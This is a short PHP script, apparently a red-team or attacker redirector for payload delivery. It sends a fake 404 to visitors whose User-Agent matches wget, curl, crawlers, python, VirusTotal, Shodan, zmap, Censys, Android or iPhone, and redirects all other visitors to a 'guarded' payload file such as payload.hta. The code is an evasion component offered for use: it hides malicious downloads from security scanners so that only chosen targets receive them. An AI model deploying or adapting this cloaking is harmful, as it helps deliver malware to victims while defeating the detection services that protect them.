<?php

/*
If you profile the targets via JQueryingU or another method add the agent to the else statement.  
*/
    if(!empty($_SERVER['HTTP_USER_AGENT'])) {
        if(preg_match("/wget/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");
        }
        elseif(preg_match("/curl/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }  
        elseif(preg_match("/bot/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/bing/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/spider/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/python/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/virustotal/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/shodan/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/zmap/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/censys/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }
        elseif(preg_match("/Android/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        } 
        elseif(preg_match("/iphone/i", $_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");  
        }            
        else {
/* Modify "placeholder" string to be your guarded file (payload.hta, etc) UNLESS you are using this with payload_changer.py.  
If you are using it with the python script you will enter it with the -p parameter. */
            header("Location: placeholder");
        }
        exit;
                }
?>